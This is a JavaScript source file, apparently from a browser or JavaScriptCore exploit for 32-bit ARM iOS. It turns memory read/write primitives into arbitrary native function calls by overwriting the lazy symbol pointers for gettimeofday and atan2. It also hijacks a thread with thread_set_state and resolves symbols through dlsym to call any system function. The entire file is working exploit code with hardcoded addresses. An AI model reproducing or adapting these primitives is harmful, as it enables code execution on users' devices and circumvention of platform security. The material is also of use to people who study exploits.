var __stack_chk_fail_lazy_addy = 0x346afc48;
var __stack_chk_fail_resolver = 0x23d751fc;
var gettimeofday_lazy_addy = 0x34d63d3c;
var atan2_lazy_addy = 0x346afc84;
var reserve_addr = 0x1a0000;
var sym_cache = {};
var slide = 0x0;
var base = 0x0;

//var slid = 0x0;

var mytask = 0;
var count = 0x130000;
var th = 0x130100;
var thread_state = 0x130200;
var countptr = 0x131000;
var thptr = 0x131004;
var thread_stateptr = 0x131008;
var thread = 0x130300;
var threadptr = 0x132300;
var threadptrptr = 0x133300;

var countptrptr = 0x132000;
var thptrptr = 0x132004;
var thread_stateptrptr = 0x132008;

var stack_shit = 0x161000;

function get_dyld_shc_slide() {
	/*
	 *  ROP chain places dyld shc slide at slide + reserve_addr + 20
	 *
	 *  shift by 12 bits bc slide is just the slide byte, whereas shit is slid
	 *  by the slide byte shifted by 12 bits
	 */
	return read_u32((slide << 12) + reserve_addr + 20);
}

function call(addy) {
	/*
	 *  this prim is shit
	 *  the idea is that the gettimeofday_lazy_addy contains the lazy symbol
	 *  address of gettimeofday for jsc, whos value will be jumped to when
	 *  calling gettimeofday
	 * 
	 *  overwrite the lazy symbol address with where we want to jump, then make
	 *  a new date object, which will call gettimeofday to give it the current
	 *  date and time.
	 * 
	 *  then put it back to the original address so it will work properly
	 * 
	 *  multithreading be damned
	 */
	var dyld_shc_slide = get_dyld_shc_slide();
	var tmp = read_u32(gettimeofday_lazy_addy + dyld_shc_slide);

	write_u32(gettimeofday_lazy_addy + dyld_shc_slide, addy);
	var d = new Date();
	write_u32(gettimeofday_lazy_addy + dyld_shc_slide, tmp);
}

function call4arg(addy, r0, r1, r2, r3) {
	/*
	 *  same idea as call, but now we use atan2, which gets 2 double arguments.
	 *  a double is 64-bits, so it's passed as 2 registers.
	 *  2 double args are then the full r0-r3 for args passed on the stack,
	 *  assuming 32-bit args.
	 * 
	 *  so, convert r0-r3 to the doubles they need to be, overwrite, and call.
	 *
	 *  the first double has the low 4-bytes passed in r0, the high 4 in r1.
	 *  second has low 4 passed in r2, high 4 passed in r3.
	 */

	var arg1 = new Int64("0x" + pad_left(r1.toString(16), '0', 8) + pad_left(r0.toString(16), '0', 8));
	var arg2 = new Int64("0x" + pad_left(r3.toString(16), '0', 8) + pad_left(r2.toString(16), '0', 8));

	arg1d = arg1.asDouble();
	arg2d = arg2.asDouble();

	delete arg1;
	delete arg2;
		
	var dyld_shc_slide = get_dyld_shc_slide();

	tmp = read_u32(atan2_lazy_addy + dyld_shc_slide);
	write_u32(atan2_lazy_addy + dyld_shc_slide, addy);
	ret = Math.atan2(arg1d, arg2d);
	write_u32(atan2_lazy_addy + dyld_shc_slide, tmp);
	
	delete tmp;
	delete arg1d;
	delete arg2d;
	
	/*
	 *  >>> 0 makes sure it's a regular uint32_t
	 */
	return (parseInt(Int64.fromDouble(ret)) & 0xffffffff) >>> 0;
}

/*
 *  call with symbol
 */
function calls4arg(sym, r0, r1, r2, r3) {
	/*
	 *  this calls dlsym with the first arg, then uses the address it returns
	 *  to call. so you can call with a symbol name instead of an address
	 */

	if (sym in sym_cache) {
		var addy = sym_cache[sym];
	} else {
		var dlsym_addy = read_u32(reserve_addr + 24 + slid);
		var shc_slide = read_u32(reserve_addr + 20 + slid);
		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, sptr(sym), 0, 0);
		sym_cache[sym] = addy;
	}
	return call4arg(addy, r0, r1, r2, r3);
}

function callnarg() {
	if (arguments.length < 1) {
		return printf("error: tried to run callnarg without args. arguments.length=%d\n", arguments.length);
	}

	/*
	 *  setup ptrs
	 */
	write_u32(countptr, count);
	write_u32(thptr, th);
	write_u32(threadptr, thread);
	write_u32(thread_stateptr, thread_state);

	write_u32(countptrptr, countptr);
	write_u32(thptrptr, thptr);
	write_u32(threadptrptr, threadptr);
	write_u32(thread_stateptrptr, thread_stateptr);	

	var addy = arguments[0];
	var dyld_shc_slide = get_dyld_shc_slide();

	/*
	 *  make __stack_chk_fail infinite loop
	 *  (works by setting its lazy addy to its resolver, thus the resolver just
	 *   endlessly jumps to iself)
	 */
	write_u32(__stack_chk_fail_lazy_addy + dyld_shc_slide, __stack_chk_fail_resolver + dyld_shc_slide);

	/*
	 *  if the thread doesn't exist, create it.
	 */
	if (read_u32(th) === 0) {
		calls4arg("pthread_create", threadptr, 0, __stack_chk_fail_resolver + dyld_shc_slide, 0);
		thread = read_u32(threadptr);
		write_u32(th, calls4arg("pthread_mach_thread_np", thread, 0, 0, 0));
	}

	/*
	 *  write first 4 to r0-r3, rest to stack
	 */
	for (var i = 1; i < arguments.length; i++) {
		if (i <= 4) {
			write_u32(thread_state + ((i - 1) << 2), arguments[i]);
		} else {
			write_u32(stack_shit + ((i - 5) << 2), arguments[i]);
		}
	}

	/*
	 *  stack
	 */
	write_u32(thread_state + (13 << 2), stack_shit);

	/*
	 *  return address, infinite loop
	 */
	write_u32(thread_state + (14 << 2), __stack_chk_fail_resolver + dyld_shc_slide);

	/*
	 *  pc
	 */
	write_u32(thread_state + (15 << 2), addy);

	/*
	 *  cpsr, magic
	 */
	if (addy & 1) {
		write_u32(thread_state + (16 << 2), 0x40000020);
	} else {
		write_u32(thread_state + (16 << 2), 0x40000000);
	}

	/*
	 *  set the state
	 */
	calls4arg("thread_set_state", read_u32(th), ARM_THREAD_STATE, thread_state, ARM_THREAD_STATE_COUNT);

	/*
	 *  probably un-necessary now, keeping in just in case for now
	 */
	calls4arg("thread_resume", read_u32(th), 0, 0, 0);
	calls4arg("usleep", 1000, 0, 0, 0);

	/*
	 *  spin wait for return
	 */
	while (true) {
		/*
		 *  reset, it's used as input for thread_state size
		 */
		write_u32(count, 0x1000);
		calls4arg("thread_get_state", read_u32(th), ARM_THREAD_STATE, thread_state, count);

		/*
		 *  if the pc is in (resolver, resolver + 8), suspend the thread
		 *  (to not spin endlessly), read r0 and return
		 */
		if ((read_u32(thread_state + (15 << 2)) - (__stack_chk_fail_resolver + dyld_shc_slide)) <= 8) {
			calls4arg("thread_suspend", read_u32(th), 0, 0, 0);
			return read_u32(thread_state);
		}

		calls4arg("usleep", 1000, 0, 0, 0);
	}
}

/*
 *  call with symbol
 */
function scall() {
	/*
	 *  this calls dlsym with the first arg, then uses the address it returns
	 *  to call. so you can call with a symbol name instead of an address
	 */

	if (arguments.length < 1) {
		return printf("warning: scall called without args. arguments.length=%d\n", arguments.length);
	}

	var sym = arguments[0];

	if (sym in sym_cache) {
		var addy = sym_cache[sym];
	} else {
		var dlsym_addy = read_u32(reserve_addr + 24 + slid);
		var shc_slide = read_u32(reserve_addr + 20 + slid);
		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, sptr(sym), 0, 0);
		sym_cache[sym] = addy;
	}

	var args_to_pass = new Array();

	args_to_pass.push(addy);

	for (var i = 1; i < arguments.length; i++) {
		if (arguments[i].constructor === String) {
			args_to_pass.push(sptr(arguments[i]));
		} else {
			args_to_pass.push(arguments[i]);
		}
	}

	return callnarg.apply(this, args_to_pass);
}